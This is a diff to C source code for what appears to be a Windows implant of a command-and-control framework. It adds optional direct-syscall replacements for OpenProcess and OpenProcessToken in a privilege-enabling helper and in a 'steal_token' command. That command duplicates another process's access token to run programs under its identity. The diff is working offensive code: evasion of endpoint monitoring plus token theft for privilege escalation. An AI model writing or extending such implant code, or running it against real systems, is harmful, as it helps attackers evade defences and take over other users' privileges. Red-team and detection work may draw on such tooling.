@@ -2,6 +2,9 @@
 #include "Checkin.h"
 #include "commands.h"
 #include "utils.h"
+#ifdef EVASION_SYSCALLS
+#include "evasion.h"
+#endif
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -20,9 +23,16 @@ static BOOL enable_privilege(LPCSTR priv_name) {
   TOKEN_PRIVILEGES tp;
   LUID luid;
 
+#ifdef EVASION_SYSCALLS
+  if (!NT_SUCCESS(kratos_NtOpenProcessToken(GetCurrentProcess(),
+                                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+                                             &hToken)))
+    return FALSE;
+#else
   if (!OpenProcessToken(GetCurrentProcess(),
                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
     return FALSE;
+#endif
 
   if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) {
     CloseHandle(hToken);
@@ -67,10 +77,19 @@ void command_steal_token(char *task_id, char *params) {
   /* Ouvrir le processus cible.
    * PROCESS_QUERY_INFORMATION en premier ; fallback sur
    * PROCESS_QUERY_LIMITED_INFORMATION pour les processus SYSTEM restrictifs. */
-  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+  HANDLE hProcess = NULL;
+#ifdef EVASION_SYSCALLS
+  if (!NT_SUCCESS(kratos_NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, pid)))
+    hProcess = NULL;
   if (!hProcess) {
-    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!NT_SUCCESS(kratos_NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, pid)))
+      hProcess = NULL;
   }
+#else
+  hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+  if (!hProcess)
+    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+#endif
   if (!hProcess) {
     char err[96];
     snprintf(err, sizeof(err),
@@ -83,6 +102,15 @@ void command_steal_token(char *task_id, char *params) {
 
   /* Get the process token */
   HANDLE hToken = NULL;
+#ifdef EVASION_SYSCALLS
+  if (!NT_SUCCESS(kratos_NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))) {
+    char err[64];
+    snprintf(err, sizeof(err), "Error: NtOpenProcessToken failed");
+    CloseHandle(hProcess);
+    send_task_response(task_id, err);
+    return;
+  }
+#else
   if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
     char err[64];
     snprintf(err, sizeof(err), "Error: OpenProcessToken failed (err %lu)",
@@ -91,6 +119,7 @@ void command_steal_token(char *task_id, char *params) {
     send_task_response(task_id, err);
     return;
   }
+#endif
   CloseHandle(hProcess);
 
   /* Dupliquer en token PRIMAIRE pour CreateProcessWithTokenW. */
